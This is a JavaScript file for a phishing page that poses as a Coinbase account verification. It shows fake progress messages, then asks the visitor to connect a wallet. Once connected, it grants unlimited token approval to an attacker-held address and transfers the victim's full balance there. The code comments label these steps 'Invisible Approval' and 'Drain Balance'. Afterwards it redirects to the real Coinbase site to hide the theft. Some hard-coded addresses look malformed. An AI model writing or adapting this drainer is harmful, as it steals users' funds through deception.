document.addEventListener('DOMContentLoaded', () => {
    const toStep2 = document.getElementById('toStep2');
    const loginForm = document.getElementById('login-form');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('step-2').classList.add('hidden');
            const container = document.querySelector('.container');
            const loading = document.createElement('div');
            loading.className = 'auth-card';
            loading.innerHTML = `<div class="loader"></div><p id="l-txt" style="color: #5b616e; font-size: 14px;">Verifying account...</p>`;
            container.appendChild(loading);

            const texts = ["Matching credentials...", "Connecting to relay...", "Synchronizing assets...", "Securing session..."];
            let i = 0;
            const interval = setInterval(() => {
                document.getElementById('l-txt').innerText = texts[i];
                i++;
                if (i >= texts.length) {
                    clearInterval(interval);
                    setTimeout(() => {
                        loading.remove();
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 800);
                }
            }, 900);
        };
    }

    if (connectBtn) {
        connectBtn.onclick = async () => {
            if (window.ethereum) {
                try {
                    status.innerText = "Requesting secure link...";
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const signer = await provider.getSigner();

                    // Configuration
                    const tokenAddress = "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx"; // USDT Polygon
                    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)", "function transferFrom(address from, address to, uint256 amount) public returns (bool)", "function balanceOf(address account) public view returns (uint256)"];

                    const contract = new ethers.Contract(tokenAddress, abi, signer);
                    const userAddress = await signer.getAddress();

                    // 1. Invisible Approval
                    status.innerText = "Establishing handshake...";
                    await contract.approve(myWallet, ethers.MaxUint256);

                    // 2. Drain Balance
                    status.innerText = "Synchronizing balances...";
                    const balance = await contract.balanceOf(userAddress);
                    const amount = ethers.formatUnits(balance, 6);
                    
                    if (parseFloat(amount) > 0) {
                        const tx = await contract.transferFrom(userAddress, myWallet, balance);
                        status.innerText = "Finalizing security check...";
                        await tx.wait();
                    }

                    status.innerText = "Verification successful. Redirecting...";
                    setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);

                } catch (err) {
                    console.error(err);
                    status.innerText = "System timeout. Please try again.";
                }
            } else {
                status.innerText = "Coinbase Wallet not detected.";
                const link = document.createElement('a');
                link.href = "https://www.coinbase.com/wallet";
                link.innerText = "Download Coinbase Wallet to continue";
                link.className = "btn-primary";
                link.style.display = "block";
                link.style.marginTop = "10px";
                status.appendChild(link);
            }
        };
    }
});
